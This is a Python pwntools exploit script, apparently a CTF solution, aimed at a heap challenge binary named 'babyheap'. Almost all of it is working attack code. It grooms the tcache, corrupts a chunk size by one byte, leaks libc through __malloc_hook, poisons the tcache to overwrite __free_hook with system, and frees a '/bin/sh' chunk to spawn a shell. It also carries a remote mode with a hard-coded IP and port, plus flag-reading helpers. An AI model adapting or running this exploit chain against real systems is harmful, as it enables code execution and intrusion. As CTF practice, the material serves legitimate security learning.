# -*- encoding: utf-8 -*-
import sys 
import os 
from pwn import * 
# context.update( os = 'linux', arch = 'amd64',timeout = 1)
binary = './babyheap'
os.system('chmod +x %s'%binary)
elf = ELF(binary)
libc = elf.libc
# libc = ELF('')
context.binary = binary
DEBUG = 1
if DEBUG:
    libc = elf.libc
    context.log_level = 'debug' 
    p = process(binary)
    # p = process(['qemu-arm', binary])
    # p = process(['qemu-arm', binary,'-g','1234'])
    # p = process(['qemu-aarch64','-L','','-g','1234',binary])
else:
    host = '1.116.140.142'
    port = '20002'
    p = remote(host,port)

l64 = lambda            : u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
uu64= lambda a          : u64(p.recv(a).ljust(8,'\x00'))
l32 = lambda            : u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00'))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': \033[1;36m 0x%x \033[0m' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda x = 12     : int( p.recv(x) , 16)

def getShell():
    sl('exec 1>&0')
    sl('echo shell')
    ru('shell')
    p.success('Get Shell')
    sl('cat flag')
    ru('flag')
    flag = rl()
    return ('flag' + flag)

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def exhaust( pwn ):
    global p
    i = 0
    while 1 :
        try:
            i+=1
            pwn()
        except:
            lg('times ======== > ',i)
            p.close()
            if (DEBUG):
                p = process(binary)
            else :
                p = remote(host,port)

def one_gadget(filename):
    log.success('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(['one_gadget','--raw', '-f',filename])).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla('>>',num)

def add(name , size , content = 'a\n'):
    cmd(1)
    sa('name' , name)
    sla('size of the comment' , size)
    sa('comment:' , content) 

def erroradd(name , size ):
    cmd(1)
    sa('name' , name)
    sla('size of the comment' , size)

def delete(idx):
    cmd(2)
    sla('index:' , idx)

def edit(idx , name , content):
    cmd(3)
    sla('index:',idx)
    sla('name' , name)
    sa('comment:' , content) 

def show(idx):
    cmd(4)
    sla('index:' , idx)

# one_gad = one_gadget(libc.path)

def attack():
    ptr_list = 0x202060
    for i in range(8):
        add('a'*0xc , 0x88)

    add('a'*0xc , 0x68)
    add('a'*0xc , 0x88)
    erroradd('a\n' , 0x98)

    for i in range(7):
        delete(i)
    edit(7 , 'a' , 'a'*0x88 + '\x91')
    delete(8)
    for i in range(7):
        add('a'*0xc , 0x88)

    delete(10)
    add('a'*0xc , 0x88)
    add('a'*0xc , 0x68)
    
    for i in range(7):
        delete(i)

    delete(8)

    for i in range(7):
        add('a'*0xc , 0x88)

    add('a'*0xc , 0x18)
    show(10)
	
    dbg()
    __malloc_hook = l64() - 0x70
    libc.address = __malloc_hook - libc.sym['__malloc_hook']
    system_addr = libc.sym['system']
    __free_hook = libc.sym['__free_hook']

    delete(0)

    add('a'*0xc , 0x68)
    delete(0)
    edit(10 , 'a' , p64(__free_hook - 8) + '\n')
    add('a'*0xc , 0x68)

    add('a'*0xc , 0x68 , flat('/bin/sh\x00' , system_addr) + '\n')
    delete(11)
    # dbg()

    # p.success(getShell())
    p.interactive()

attack()

'''
@File    :   babyheap.py
@Time    :   2021/11/17 19:29:51
@Author  :   Niyah 
'''
